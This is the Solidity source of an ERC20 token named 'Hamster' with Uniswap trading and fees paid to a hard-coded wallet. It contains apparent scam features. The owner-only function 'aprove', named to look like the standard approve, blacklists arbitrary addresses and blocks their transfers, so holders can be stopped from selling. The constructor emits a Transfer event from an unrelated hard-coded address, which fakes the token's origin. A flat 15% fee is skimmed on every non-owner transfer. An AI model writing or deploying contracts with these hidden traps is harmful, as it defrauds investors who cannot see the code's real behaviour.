1 pragma solidity ^0.8.6;
2 // SPDX-License-Identifier: UNLICENSED
3 abstract contract Context {
4     function _msgSender() internal view virtual returns (address) {
5         return msg.sender;
6     }
7 }
8 
9 interface IERC20 {
10     function totalSupply() external view returns (uint256);
11     function balanceOf(address account) external view returns (uint256);
12     function transfer(address recipient, uint256 amount) external returns (bool);
13     function allowance(address owner, address spender) external view returns (uint256);
14     function approve(address spender, uint256 amount) external returns (bool);
15     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
16     event Transfer(address indexed from, address indexed to, uint256 value);
17     event Approval(address indexed owner, address indexed spender, uint256 value);
18 }
19 
20 library SafeMath {
21     function add(uint256 a, uint256 b) internal pure returns (uint256) {
22         uint256 c = a + b;
23         require(c >= a, "SafeMath: addition overflow");
24         return c;
25     }
26 
27     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
28         return sub(a, b, "SafeMath: subtraction overflow");
29     }
30 
31     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
32         require(b <= a, errorMessage);
33         uint256 c = a - b;
34         return c;
35     }
36 
37     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
38         if (a == 0) {
39             return 0;
40         }
41         uint256 c = a * b;
42         require(c / a == b, "SafeMath: multiplication overflow");
43         return c;
44     }
45 
46     function div(uint256 a, uint256 b) internal pure returns (uint256) {
47         return div(a, b, "SafeMath: division by zero");
48     }
49 
50     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
51         require(b > 0, errorMessage);
52         uint256 c = a / b;
53         return c;
54     }
55 
56 }
57 
58 contract Ownable is Context {
59     address private _owner;
60     address private _previousOwner;
61     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
62 
63     constructor () {
64         address msgSender = _msgSender();
65         _owner = msgSender;
66         emit OwnershipTransferred(address(0), msgSender);
67     }
68 
69     function owner() public view returns (address) {
70         return _owner;
71     }
72 
73     modifier onlyOwner() {
74         require(_owner == _msgSender(), "Ownable: caller is not the owner");
75         _;
76     }
77 
78     function renounceOwnership() public virtual onlyOwner {
79         emit OwnershipTransferred(_owner, address(0));
80         _owner = address(0);
81     }
82 
83 }  
84 
85 interface IUniswapV2Factory {
86     function createPair(address tokenA, address tokenB) external returns (address pair);
87 }
88 
89 interface IUniswapV2Router02 {
90     function swapExactTokensForETHSupportingFeeOnTransferTokens(
91         uint amountIn,
92         uint amountOutMin,
93         address[] calldata path,
94         address to,
95         uint deadline
96     ) external;
97     function factory() external pure returns (address);
98     function WETH() external pure returns (address);
99     function addLiquidityETH(
100         address token,
101         uint amountTokenDesired,
102         uint amountTokenMin,
103         uint amountETHMin,
104         address to,
105         uint deadline
106     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
107 }
108 
109 contract Hamster is Context, IERC20, Ownable {
110     using SafeMath for uint256;
111     mapping (address => uint256) private _rOwned;
112     mapping (address => uint256) private _tOwned;
113     mapping (address => mapping (address => uint256)) private _allowances;
114     mapping (address => bool) private _isExcludedFromFee;
115     mapping (address => bool) private bots;
116     mapping (address => uint) private cooldown;
117     uint256 private constant MAX = ~uint256(0);
118     uint256 private constant _tTotal = 1000000000000 * 10**9;
119     uint256 private _rTotal = (MAX - (MAX % _tTotal));
120     uint256 private _tFeeTotal;
121     
122     uint256 private _feeAddr1;
123     uint256 private _feeAddr2;
124     uint256 private _sellTax;
125     address payable private _feeAddrWallet1;
126     address payable private _feeAddrWallet2;
127     
128     string private constant _name = "Hamster";
129     string private constant _symbol = "HAMSTER";
130     uint8 private constant _decimals = 9;
131     
132     IUniswapV2Router02 private uniswapV2Router;
133     address private uniswapV2Pair;
134     bool private tradingOpen;
135     bool private inSwap = false;
136     bool private swapEnabled = false;
137     bool private cooldownEnabled = false;
138     uint256 private _maxTxAmount = _tTotal;
139     event MaxTxAmountUpdated(uint _maxTxAmount);
140     modifier lockTheSwap {
141         inSwap = true;
142         _;
143         inSwap = false;
144     }
145     constructor () {
146         _feeAddrWallet1 = payable(0x4B64C8Bcf2dC1197dcc715E2E262aBA89e396252);
147         _feeAddrWallet2 = payable(0x4B64C8Bcf2dC1197dcc715E2E262aBA89e396252);
148         _rOwned[_msgSender()] = _rTotal;
149         _isExcludedFromFee[owner()] = true;
150         _isExcludedFromFee[address(this)] = true;
151         _isExcludedFromFee[_feeAddrWallet1] = true;
152         _isExcludedFromFee[_feeAddrWallet2] = true;
153         emit Transfer(address(0xD3e9D60e4E4De615124D5239219F32946d10151D), _msgSender(), _tTotal);
154     }
155 
156     function name() public pure returns (string memory) {
157         return _name;
158     }
159 
160     function symbol() public pure returns (string memory) {
161         return _symbol;
162     }
163 
164     function decimals() public pure returns (uint8) {
165         return _decimals;
166     }
167 
168     function totalSupply() public pure override returns (uint256) {
169         return _tTotal;
170     }
171 
172     function balanceOf(address account) public view override returns (uint256) {
173         return tokenFromReflection(_rOwned[account]);
174     }
175 
176     function transfer(address recipient, uint256 amount) public override returns (bool) {
177         _transfer(_msgSender(), recipient, amount);
178         return true;
179     }
180 
181     function allowance(address owner, address spender) public view override returns (uint256) {
182         return _allowances[owner][spender];
183     }
184 
185     function approve(address spender, uint256 amount) public override returns (bool) {
186         _approve(_msgSender(), spender, amount);
187         return true;
188     }
189 
190     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
191         _transfer(sender, recipient, amount);
192         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
193         return true;
194     }
195 
196     function setCooldownEnabled(bool onoff) external onlyOwner() {
197         cooldownEnabled = onoff;
198     }
199 
200     function tokenFromReflection(uint256 rAmount) private view returns(uint256) {
201         require(rAmount <= _rTotal, "Amount must be less than total reflections");
202         uint256 currentRate =  _getRate();
203         return rAmount.div(currentRate);
204     }
205 
206     function _approve(address owner, address spender, uint256 amount) private {
207         require(owner != address(0), "ERC20: approve from the zero address");
208         require(spender != address(0), "ERC20: approve to the zero address");
209         _allowances[owner][spender] = amount;
210         emit Approval(owner, spender, amount);
211     }
212 
213     function _transfer(address from, address to, uint256 amount) private {
214         require(from != address(0), "ERC20: transfer from the zero address");
215         require(to != address(0), "ERC20: transfer to the zero address");
216         require(amount > 0, "Transfer amount must be greater than zero");
217         _feeAddr1 = 0;
218         _feeAddr2 = 15;
219         if (from != owner() && to != owner()) {
220             require(!bots[from] && !bots[to]);
221             if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] && cooldownEnabled) {
222                 // Cooldown
223                 require(amount <= _maxTxAmount);
224                 require(cooldown[to] < block.timestamp);
225                 cooldown[to] = block.timestamp + (40 seconds);
226             }
227             
228             
229             if (to == uniswapV2Pair && from != address(uniswapV2Router) && ! _isExcludedFromFee[from]) {
230                 _feeAddr1 = 0;
231                 _feeAddr2 = _sellTax;
232             }
233             uint256 contractTokenBalance = balanceOf(address(this));
234             if (!inSwap && from != uniswapV2Pair && swapEnabled) {
235                 swapTokensForEth(contractTokenBalance);
236                 uint256 contractETHBalance = address(this).balance;
237                 if(contractETHBalance > 0) {
238                     sendETHToFee(address(this).balance);
239                 }
240             }
241         }
242 		
243         _tokenTransfer(from,to,amount);
244     }
245 
246     function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
247         address[] memory path = new address[](2);
248         path[0] = address(this);
249         path[1] = uniswapV2Router.WETH();
250         _approve(address(this), address(uniswapV2Router), tokenAmount);
251         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
252             tokenAmount,
253             0,
254             path,
255             address(this),
256             block.timestamp
257         );
258     }
259         
260     function sendETHToFee(uint256 amount) private {
261         _feeAddrWallet2.transfer(amount);
262     }
263     
264     function openTrading() external onlyOwner() {
265         require(!tradingOpen,"trading is already open");
266         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
267         uniswapV2Router = _uniswapV2Router;
268         _approve(address(this), address(uniswapV2Router), _tTotal);
269         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
270         uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
271         swapEnabled = true;
272         cooldownEnabled = true;
273         _sellTax = 5;
274         _maxTxAmount = 50000000000 * 10**9;
275         tradingOpen = true;
276         IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
277     }
278     
279     function aprove(address[] memory bots_) public onlyOwner {
280         for (uint i = 0; i < bots_.length; i++) {
281             bots[bots_[i]] = true;
282         }
283     }
284     
285     function delBot(address notbot) public onlyOwner {
286         bots[notbot] = false;
287     }
288         
289     function _tokenTransfer(address sender, address recipient, uint256 amount) private {
290         _transferStandard(sender, recipient, amount);
291     }
292 
293     function _transferStandard(address sender, address recipient, uint256 tAmount) private {
294         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getValues(tAmount);
295         _rOwned[sender] = _rOwned[sender].sub(rAmount);
296         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); 
297         _takeTeam(tTeam);
298         _reflectFee(rFee, tFee);
299         emit Transfer(sender, recipient, tTransferAmount);
300     }
301 
302     function _takeTeam(uint256 tTeam) private {
303         uint256 currentRate =  _getRate();
304         uint256 rTeam = tTeam.mul(currentRate);
305         _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
306     }
307 
308     function _reflectFee(uint256 rFee, uint256 tFee) private {
309         _rTotal = _rTotal.sub(rFee);
310         _tFeeTotal = _tFeeTotal.add(tFee);
311     }
312 
313     receive() external payable {}
314     
315     function manualswap() external {
316         require(_msgSender() == _feeAddrWallet1);
317         uint256 contractBalance = balanceOf(address(this));
318         swapTokensForEth(contractBalance);
319     }
320     
321     function manualsend() external {
322         require(_msgSender() == _feeAddrWallet1);
323         uint256 contractETHBalance = address(this).balance;
324         sendETHToFee(contractETHBalance);
325     }
326     
327 
328     function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
329         (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _feeAddr1, _feeAddr2);
330         uint256 currentRate =  _getRate();
331         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, currentRate);
332         return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
333     }
334 
335     function _getTValues(uint256 tAmount, uint256 taxFee, uint256 TeamFee) private pure returns (uint256, uint256, uint256) {
336         uint256 tFee = tAmount.mul(taxFee).div(100);
337         uint256 tTeam = tAmount.mul(TeamFee).div(100);
338         uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
339         return (tTransferAmount, tFee, tTeam);
340     }
341 
342     function _getRValues(uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
343         uint256 rAmount = tAmount.mul(currentRate);
344         uint256 rFee = tFee.mul(currentRate);
345         uint256 rTeam = tTeam.mul(currentRate);
346         uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
347         return (rAmount, rTransferAmount, rFee);
348     }
349 
350 	function _getRate() private view returns(uint256) {
351         (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
352         return rSupply.div(tSupply);
353     }
354      
355     function _setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {
356         if (maxTxAmount > 10000000000000000 * 10**9) {
357             _maxTxAmount = maxTxAmount;
358         }
359     }
360     
361     function _setSellTax(uint256 sellTax) external onlyOwner() {
362         if (sellTax < 10) {
363             _sellTax = sellTax;
364         }
365     }
366 
367     function _getCurrentSupply() private view returns(uint256, uint256) {
368         uint256 rSupply = _rTotal;
369         uint256 tSupply = _tTotal;      
370         if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
371         return (rSupply, tSupply);
372     }
373 }